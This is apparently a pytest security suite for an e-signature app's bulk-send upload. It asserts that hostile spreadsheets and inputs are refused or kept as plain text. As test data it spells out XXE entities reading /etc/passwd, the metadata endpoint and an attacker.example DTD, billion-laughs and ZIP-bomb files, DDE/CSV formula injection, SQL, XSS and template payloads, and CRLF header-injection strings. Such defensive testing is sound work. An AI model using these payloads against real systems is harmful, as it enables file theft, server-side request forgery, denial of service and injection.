"""Hostile input to a bulk send (Bulk send LLD §4, §8): files built to harm the reader, values
built to be run somewhere else, and requests from people who may not make them.

Each test is an attack that was tried against the code; it stays here so it stays refused.
"""

from __future__ import annotations

import io
import time
import uuid
import zipfile
from collections.abc import Callable
from typing import Any

import pytest
from fastapi.testclient import TestClient
from openpyxl import Workbook, load_workbook
from sqlalchemy import text

from signora.kernel.db import Database
from signora.modules.envelopes import bulk_routes
from signora.modules.envelopes.bulk_files import (
    MAX_SCANNED_ROWS,
    ROWS_SHEET,
    read_file,
    write_rows,
    write_template,
)
from signora.modules.envelopes.bulk_sheet import CELL_MAX, Column, RowIn, clean_cell
from signora.modules.envelopes.errors import TooManyRows, UnreadableFile
from tests.modules.envelopes.conftest import sendable
from tests.modules.envelopes.test_bulk import (
    check,
    clients,
    csv_of,
    defaults,
    filled,
    rows_of,
    run_batch,
    send_batch,
    upload,
    version_url,
)
from tests.modules.identity_access.conftest import Account
from tests.modules.review.test_save import DOCUMENTS

SHEET = "xl/worksheets/sheet1.xml"
NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
HEADERS = (
    '<row r="1"><c r="A1" t="inlineStr"><is><t>Client name</t></is></c>'
    '<c r="B1" t="inlineStr"><is><t>Client email</t></is></c></row>'
)


def workbook() -> bytes:
    book = Workbook()
    sheet = book.active
    assert sheet is not None
    sheet.title = ROWS_SHEET
    sheet.append(["Client name", "Client email"])
    sheet.append(["Avery Lin", "avery@example.com"])
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


def with_member(data: bytes, member: str, content: bytes) -> bytes:
    """The workbook with one of its parts replaced (or added)."""
    source = zipfile.ZipFile(io.BytesIO(data))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for item in source.infolist():
            if item.filename != member:
                target.writestr(item.filename, source.read(item.filename))
        target.writestr(member, content)
    return out.getvalue()


def sheet_xml(rows: str, *, doctype: str = "", dimension: str = "A1:B2") -> bytes:
    return (
        f'<?xml version="1.0"?>{doctype}<worksheet xmlns="{NS}">'
        f'<dimension ref="{dimension}"/><sheetData>{HEADERS}{rows}</sheetData></worksheet>'
    ).encode()


def cell_row(number: int, value: str, *, column: str = "A", kind: str = "inlineStr") -> str:
    inner = f"<is><t>{value}</t></is>" if kind == "inlineStr" else f"<v>{value}</v>"
    return f'<row r="{number}"><c r="{column}{number}" t="{kind}">{inner}</c></row>'


# --- files built to harm the reader --------------------------------------------------------------


@pytest.mark.parametrize(
    "doctype",
    [
        '<!DOCTYPE x [<!ENTITY bad SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE x [<!ENTITY bad SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
        '<!DOCTYPE x [<!ENTITY % ext SYSTEM "http://attacker.example/x.dtd"> %ext;]>',
    ],
)
def test_a_sheet_that_names_an_outside_entity_is_refused_not_resolved(doctype: str) -> None:
    """XXE: an entity that points at a local file or an internal address is never read."""
    data = with_member(workbook(), SHEET, sheet_xml(cell_row(2, "&bad;"), doctype=doctype))
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", data)


def test_shared_strings_that_name_an_outside_entity_are_refused() -> None:
    shared = (
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY bad SYSTEM "file:///etc/passwd">]>'
        f'<sst xmlns="{NS}" count="1" uniqueCount="1"><si><t>&bad;</t></si></sst>'
    ).encode()
    data = with_member(workbook(), SHEET, sheet_xml(cell_row(2, "0", kind="s")))
    data = with_member(data, "xl/sharedStrings.xml", shared)
    try:
        read = read_file("clients.xlsx", data)
    except UnreadableFile:
        return
    # Whatever it read, it is not the file the entity pointed at.
    assert all("root:" not in cell for _, cells in read.rows for cell in cells)


def test_entities_that_expand_without_end_are_refused_at_once() -> None:
    """Billion laughs: ten entities, each ten of the one before."""
    entities = '<!ENTITY a "lol">' + "".join(
        f'<!ENTITY {chr(98 + i)} "{("&" + chr(97 + i) + ";") * 10}">' for i in range(9)
    )
    data = with_member(
        workbook(), SHEET, sheet_xml(cell_row(2, "&j;"), doctype=f"<!DOCTYPE x [{entities}]>")
    )
    started = time.perf_counter()
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", data)
    assert time.perf_counter() - started < 1.0


def test_a_small_file_that_unpacks_to_a_huge_one_is_refused_before_it_is_parsed() -> None:
    """A ZIP bomb: 80 MB of one letter is about 80 KB compressed."""
    bomb = sheet_xml(cell_row(2, "A" * (80 * 1024 * 1024)))
    data = with_member(workbook(), SHEET, bomb)
    assert len(data) < 1024 * 1024  # it passes the upload's size limit
    started = time.perf_counter()
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", data)
    assert time.perf_counter() - started < 1.0

    # The same weight hidden in a part the reader never opens is refused too.
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", with_member(workbook(), "docProps/big.xml", b"0" * (80 * 2**20)))


def test_an_archive_of_thousands_of_parts_is_refused() -> None:
    data = workbook()
    out = io.BytesIO(data)
    with zipfile.ZipFile(out, "a", zipfile.ZIP_DEFLATED) as archive:
        for n in range(2000):
            archive.writestr(f"junk/{n}.xml", b"")
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", out.getvalue())


def test_a_row_a_million_lines_down_is_not_walked_to() -> None:
    data = with_member(
        workbook(), SHEET, sheet_xml(cell_row(1_048_576, "x"), dimension="A1:B1048576")
    )
    started = time.perf_counter()
    with pytest.raises(TooManyRows) as refused:
        read_file("clients.xlsx", data)
    assert time.perf_counter() - started < 1.0
    assert f"{MAX_SCANNED_ROWS:,}" in str(refused.value)


def test_a_sheet_that_claims_the_whole_grid_reads_only_its_columns() -> None:
    data = with_member(
        workbook(),
        SHEET,
        sheet_xml(
            cell_row(2, "Maya") + cell_row(3, "far", column="XFD"), dimension="A1:XFD1048576"
        ),
    )
    started = time.perf_counter()
    try:
        read = read_file("clients.xlsx", data)
    except (UnreadableFile, TooManyRows):
        read = None
    assert time.perf_counter() - started < 2.0
    if read is not None:
        assert all(len(cells) <= 2 for _, cells in read.rows)


@pytest.mark.parametrize(
    "data",
    [
        b"PK\x03\x04" + b"\x00" * 64,
        b"PK\x03\x04" + bytes(range(256)) * 40,
        with_member(workbook(), SHEET, b"<worksheet"),  # cut short
        with_member(workbook(), SHEET, b"\xff\xfe not xml at all"),
        with_member(workbook(), "xl/workbook.xml", b"<workbook/>"),
        with_member(workbook(), "[Content_Types].xml", b"<Types/>"),
    ],
)
def test_a_broken_workbook_is_unreadable_never_an_error_of_ours(data: bytes) -> None:
    with pytest.raises(UnreadableFile):
        read_file("clients.xlsx", data)


def test_a_formula_in_an_uploaded_cell_is_never_run() -> None:
    """A formula cell is read as the value saved with it, or as nothing; never evaluated."""
    formula = '<row r="2"><c r="A2"><f>HYPERLINK("http://attacker.example","x")</f></c></row>'
    read_or_none: Any
    try:
        read_or_none = read_file("clients.xlsx", with_member(workbook(), SHEET, sheet_xml(formula)))
    except Exception as error:
        assert type(error).__name__ in ("EmptyFile", "UnreadableFile")
        return
    assert all("HYPERLINK" not in cell for _, cells in read_or_none.rows for cell in cells)


# --- values built to be run somewhere else -------------------------------------------------------


def test_control_characters_never_reach_a_value() -> None:
    assert (
        clean_cell("Ave\x00ry\x1b[31m Lin\r\nBcc: x@evil.example")
        == "Ave ry [31m Lin  Bcc: x@evil.example"
    )
    assert clean_cell("\u0085\u009fname\u007f") == "name"
    assert len(clean_cell("x" * 50_000)) == CELL_MAX
    # The same cleaning for rows the browser sends back, and for a file's cells.
    assert RowIn(row_no=2, cells={"k": "a\x00b\nc"}).cells == {"k": "a b c"}
    read = read_file("x.csv", b'Client name,Client email\n"Av\x1bery\nLin",a@example.com\n')
    assert read.rows[0][1][0] == "Av ery Lin"


def test_a_templates_label_is_never_written_as_a_formula() -> None:
    """A field label is typed by a person: in the spreadsheet a colleague opens, it is text."""
    columns = [
        Column(
            key="a",
            header='=HYPERLINK("http://attacker.example","Click")',
            kind="text",
            required=False,
        ),
        Column(key="b", header="@SUM(1+1)*cmd|' /C calc'!A0", kind="text", required=True),
    ]
    book = load_workbook(io.BytesIO(write_template(columns, version_id=uuid.uuid4(), title="=1+1")))
    for sheet in book.worksheets:
        for row in sheet.iter_rows():
            for cell in row:
                assert cell.data_type != "f", (sheet.title, cell.coordinate, cell.value)
    assert book[ROWS_SHEET]["A1"].value == '=HYPERLINK("http://attacker.example","Click")'


def test_rows_downloaded_as_csv_cannot_run_as_formulas_and_read_back_unchanged() -> None:
    columns = [Column(key="a", header="Name", kind="text", required=False)]
    hostile = ["=cmd|' /C calc'!A0", "+1 555 0100", "-5", "@SUM(A1)", "\tx", "plain", "'quoted"]

    data = write_rows(columns, [[value] for value in hostile])

    lines = data.decode("utf-8-sig").splitlines()[1:]
    assert all(not line.lstrip('"').startswith(("=", "+", "-", "@", "\t")) for line in lines)
    # Uploaded again, the values are what they were (a tab is cleaned to nothing either way).
    read = read_file("left-out.csv", data)
    assert [cells[0] for _, cells in read.rows] == [
        "=cmd|' /C calc'!A0",
        "+1 555 0100",
        "-5",
        "@SUM(A1)",
        "x",
        "plain",
        "'quoted",
    ]


PAYLOADS = [
    "Robert'); DROP TABLE envelopes;--",
    "' OR '1'='1",
    "<script>alert(document.cookie)</script>",
    '"><img src=x onerror=alert(1)>',
    "{{7*7}} ${7*7} #{7*7} <%= 7*7 %>",
    "../../../../etc/passwd",
    "%00%0d%0aSet-Cookie: x=1",
    "\u202egnp.exe",  # right-to-left override
    "\U0001d4e4\U0001d4f7 \U0001f680 \u05e2\u05d1\u05e8\u05d9\u05ea \u0627\u0644\u0639\u0631\u0628",
]


def test_injection_payloads_are_stored_as_the_text_they_are(
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    company: Account,
    committing_db: Database,
) -> None:
    """SQL, markup and template syntax in a name or a value: kept as text, word for word, and the
    tables are still there afterwards."""
    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(len(PAYLOADS)))
    name_key = next(c["key"] for c in sheet["columns"] if c["header"] == "Client name")
    for row, payload in zip(sheet["rows"], PAYLOADS, strict=True):
        row["cells"][name_key] = payload

    checked = check(owner, doc, sheet, defaults(doc, company))
    assert checked.status_code == 200, checked.text
    assert [
        p for row in checked.json()["rows"] for p in row["problems"] if p["level"] == "error"
    ] == []

    batch = send_batch(owner, doc, sheet, defaults(doc, company))
    assert batch.status_code == 201, batch.text
    run_batch(committing_db, batch.json()["id"])

    rows = rows_of(committing_db, batch.json()["id"])
    assert [row.status for row in rows] == ["sent"] * len(PAYLOADS)
    names = [
        owner.get(f"/api/v1/envelopes/{row.envelope_id}").json()["recipients"][0]["name"]
        for row in rows
    ]
    assert names == PAYLOADS
    with committing_db.unit_of_work() as uow:
        assert uow.session.execute(text("SELECT count(*) FROM envelopes")).scalar_one() >= len(rows)


def test_a_nul_or_a_line_break_in_a_row_from_the_browser_cannot_break_the_send(
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    company: Account,
    committing_db: Database,
) -> None:
    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(1))
    name_key = next(c["key"] for c in sheet["columns"] if c["header"] == "Client name")
    sheet["rows"][0]["cells"][name_key] = "Maya\u0000 Chen\r\nBcc: attacker@evil.example"

    batch = send_batch(owner, doc, sheet, defaults(doc, company))

    assert batch.status_code == 201, batch.text
    run_batch(committing_db, batch.json()["id"])
    row = rows_of(committing_db, batch.json()["id"])[0]
    assert row.status == "sent", row.error
    name = owner.get(f"/api/v1/envelopes/{row.envelope_id}").json()["recipients"][0]["name"]
    assert name == "Maya  Chen  Bcc: attacker@evil.example"  # one line: no header of its own


def test_a_hostile_header_is_shown_as_cleaned_text_and_cut_short(
    owner: TestClient, run: Callable[..., None], detect: Callable[..., None]
) -> None:
    doc = sendable(owner, run, detect)
    header = "<script>alert(1)</script>\x1b[2J" + "A" * 5000

    answer = upload(owner, doc, "x.csv", csv_of(["Client name", f'"{header}"'], [["Maya", "x"]]))

    assert answer.status_code == 200, answer.text
    (problem,) = answer.json()["problems"]
    assert len(problem) < 200 and "\x1b" not in problem
    assert answer.headers["content-type"].startswith("application/json")  # never markup


def test_a_templates_name_cannot_split_the_download_header(
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    committing_db: Database,
) -> None:
    doc = sendable(owner, run, detect)
    with committing_db.unit_of_work() as uow:
        uow.session.execute(
            text("UPDATE documents SET name = :n WHERE id = :d"),
            {"n": 'NDA"\r\nSet-Cookie: stolen=1\r\n\r\n<html>', "d": doc.document_id},
        )

    response = owner.get(f"{version_url(doc)}/bulk-template")

    assert response.status_code == 200, response.text
    assert "set-cookie" not in {key.lower() for key in response.headers} or all(
        "stolen" not in value for value in response.headers.get_list("set-cookie")
    )
    disposition = response.headers["content-disposition"]
    assert "\r" not in disposition and "\n" not in disposition
    assert disposition.count('"') == 2  # the name's own quote did not close the value early
    assert response.content[:2] == b"PK"  # the body is the spreadsheet, not the name


# --- requests that are too much, or not allowed --------------------------------------------------


def test_a_file_over_the_size_limit_is_refused_as_it_arrives(
    owner: TestClient, run: Callable[..., None], detect: Callable[..., None]
) -> None:
    doc = sendable(owner, run, detect)
    assert upload(owner, doc, "big.csv", b"a,b\n" + b"x" * (5 * 1024 * 1024 + 1)).status_code == 413


def test_rows_from_the_browser_are_bounded(
    owner: TestClient, run: Callable[..., None], detect: Callable[..., None], company: Account
) -> None:
    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(1))
    one = sheet["rows"][0]

    def answer(rows: list[dict[str, Any]]) -> int:
        return int(check(owner, doc, {**sheet, "rows": rows}, defaults(doc, company)).status_code)

    assert answer([{**one, "row_no": n + 2} for n in range(1001)]) == 422  # too many rows
    assert answer([{**one, "cells": {f"k{n}": "x" for n in range(501)}}]) == 422  # too many cells
    assert answer([{**one, "cells": {"k" * 121: "x"}}]) == 422  # a key no column has
    assert answer([{**one, "cells": {"k": "x" * 20_001}}]) == 422  # a cell no value needs
    assert answer([{**one, "row_no": 0}]) == 422


def test_two_rows_with_one_number_are_not_a_batch(
    owner: TestClient, run: Callable[..., None], detect: Callable[..., None], company: Account
) -> None:
    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(2))
    sheet["rows"][1]["row_no"] = sheet["rows"][0]["row_no"]

    refused = send_batch(owner, doc, sheet, defaults(doc, company))

    assert refused.status_code == 422, refused.text


def test_writes_need_the_csrf_token_and_a_session(
    make_client: Callable[..., TestClient],
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    company: Account,
) -> None:
    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(1))
    body = {
        "columns": [c["key"] for c in sheet["columns"]],
        "rows": [{"row_no": r["row_no"], "cells": r["cells"]} for r in sheet["rows"]],
        "defaults": defaults(doc, company),
    }
    batch = {**body, "version_id": doc.version_id, "file_name": "x.csv"}
    del batch["columns"]
    posts = [
        (f"{version_url(doc)}/bulk-rows/check", body),
        (f"{version_url(doc)}/bulk-rows/left-out", body),
        (f"{DOCUMENTS}/{doc.document_id}/envelope-batches", batch),
    ]

    # Signed in, but without the token another site could not know.
    for url, payload in posts:
        assert owner.post(url, json=payload).status_code == 403, url
    assert (
        owner.post(f"{version_url(doc)}/bulk-rows?filename=x.csv", content=b"a,b\n1,2").status_code
        == 403
    )

    # Not signed in at all.
    anonymous = make_client()
    assert anonymous.get(f"{version_url(doc)}/bulk-template").status_code == 401
    assert (
        anonymous.get(f"/api/v1/departments/{doc.department_id}/envelope-batches").status_code
        == 401
    )
    for url, payload in posts:
        assert anonymous.post(url, json=payload).status_code in (401, 403), url


def test_a_batch_cannot_be_aimed_at_another_companys_template_or_colleague(
    make_client: Callable[..., TestClient],
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    company: Account,
    make_workspace: Callable[..., Account],
) -> None:
    from tests.modules.documents.conftest import log_in

    doc = sendable(owner, run, detect)
    sheet = filled(owner, doc, clients(1))
    other = make_workspace()
    stranger = make_client()
    log_in(stranger, other.email)

    # Another company's person cannot read, check or send this template's sheet.
    assert check(stranger, doc, sheet, defaults(doc, company)).status_code == 404
    assert send_batch(stranger, doc, sheet, defaults(doc, company)).status_code == 404
    assert (
        upload(stranger, doc, "x.csv", b"Client name,Client email\na,b@example.com").status_code
        == 404
    )

    # And this company's sender cannot name another company's person as the countersigner.
    firm_key = next(c["key"] for c in sheet["columns"] if c["header"] == "Firm countersigner")
    sheet["rows"][0]["cells"][firm_key] = other.email
    judged = check(owner, doc, sheet, defaults(doc, company)).json()
    assert [p["message"] for p in judged["rows"][0]["problems"]] == ["Not a colleague's email"]
    assert send_batch(owner, doc, sheet, defaults(doc, company)).status_code == 422


def test_reading_files_is_limited_per_person(
    owner: TestClient,
    run: Callable[..., None],
    detect: Callable[..., None],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    doc = sendable(owner, run, detect)
    monkeypatch.setattr(bulk_routes, "FILES_PER_HOUR", 2)
    file = csv_of(["Client name", "Client email"], [["Maya", "maya@example.com"]])

    answers = [upload(owner, doc, "x.csv", file).status_code for _ in range(3)]

    assert answers == [200, 200, 429]
